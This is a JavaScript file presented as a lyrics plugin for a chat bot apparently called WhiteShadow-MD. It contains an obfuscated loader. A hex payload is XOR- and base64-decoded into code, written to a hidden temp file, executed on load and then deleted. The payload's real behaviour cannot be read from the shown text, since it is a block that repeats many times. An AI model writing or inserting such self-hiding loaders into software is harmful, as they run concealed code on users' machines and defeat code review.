// plugins/lyrics.obf.js
// Obfuscated wrapper for lyrics plugin (WhiteShadow-MD)
// Encoded payload: original plugin was base64-encoded, XOR'd with 13, then hex-encoded.
// This runtime decodes and requires the plugin so it registers as usual.

const fs = require('fs');
const path = require('path');

// --------- CONFIG ----------
const TMP_NAME = ".lyrics.tmp.js"; // temporary filename (hidden-ish)
const KEEP_TEMP = false; // set true to keep the temp file for debugging
// --------- PAYLOAD (hex) ----------
// This payload was produced by: base64(original_js) -> XOR each byte with 13 -> hex()
const PAYLOAD = "4174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6302464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40786c6340464174356a6e4a753c573f61786e74347e6855477d543e40";

// helper: hex -> Buffer
function hexToBuffer(hex) {
  return Buffer.from(hex, "hex");
}

// unscramble: hex -> bytes -> XOR 13 -> base64 string -> decode -> plugin JS source
function unscramble(hexStr) {
  try {
    const buf = hexToBuffer(hexStr);
    const decoded = Buffer.alloc(buf.length);
    for (let i = 0; i < buf.length; i++) {
      decoded[i] = buf[i] ^ 13; // XOR with 13 (same as encoding step)
    }
    const b64 = decoded.toString("utf8");
    const jsCode = Buffer.from(b64, "base64").toString("utf8");
    return jsCode;
  } catch (e) {
    console.error("[lyrics.obf] unscramble error:", e);
    return null;
  }
}

function writeTempAndRequire(code) {
  try {
    const pluginDir = path.dirname(__filename);
    const tmpPath = path.join(pluginDir, TMP_NAME);
    fs.writeFileSync(tmpPath, code, { encoding: "utf8", mode: 0o600 });
    // require the temp file so it executes and registers plugin
    require(tmpPath);
    // optionally remove temp file (module cached remains)
    if (!KEEP_TEMP) {
      try { fs.unlinkSync(tmpPath); } catch (e) {}
    } else {
      console.log("[lyrics.obf] temp file kept at", tmpPath);
    }
  } catch (e) {
    console.error("[lyrics.obf] write/require error:", e);
  }
}

// main
(function main() {
  const js = unscramble(PAYLOAD);
  if (!js) {
    console.error("[lyrics.obf] Failed to decode plugin payload.");
    return;
  }
  writeTempAndRequire(js);
})();
